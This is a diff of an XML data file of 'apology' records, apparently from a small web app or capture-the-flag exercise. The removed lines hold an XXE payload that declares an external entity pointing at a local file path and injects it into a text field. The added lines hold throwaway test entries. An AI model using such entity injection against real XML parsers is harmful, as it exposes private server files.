@@ -1,10 +1,9 @@
 <?xml version="1.0"?>
-<!DOCTYPE admin
-[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:////home/texh0k0t/kek'>]><root><apologies><apology id='qwertyu' private='false' nickname_receiver='admin_pitux'><apology_text>&xxe;</apology_text></apology></apologies></root><!-- PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<!DOCTYPE admin PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
 <root>
   <apologies>
-    <apology id="0xEhjqLFzG" private="false" nickname_receiver="Jack">
+    <apology id="IYAq71GZvc" private="false" nickname_receiver="Jack">
       <apology_text>HAX1</apology_text>
-    </apology>
+    </apology><apology id="H4fPem81hG" private="" nickname_receiver=""><apology_text/></apology><apology id="E4Xz7DK1WB" private="false" nickname_receiver="admin"><apology_text>kek</apology_text></apology><apology id="sfQH2mUgLP" private="false" nickname_receiver="admin"><apology_text>kek</apology_text></apology><apology id="6RAfrsvwj9" private="false" nickname_receiver="admin"><apology_text>kek</apology_text></apology><apology id="Ew6OIh0H9c" private="false" nickname_receiver="admin13"><apology_text>keklokkkasd</apology_text></apology><apology id="EzCsDQrLnv" private="false" nickname_receiver="asdd"><apology_text>asdd</apology_text></apology>
   </apologies>
 </root>
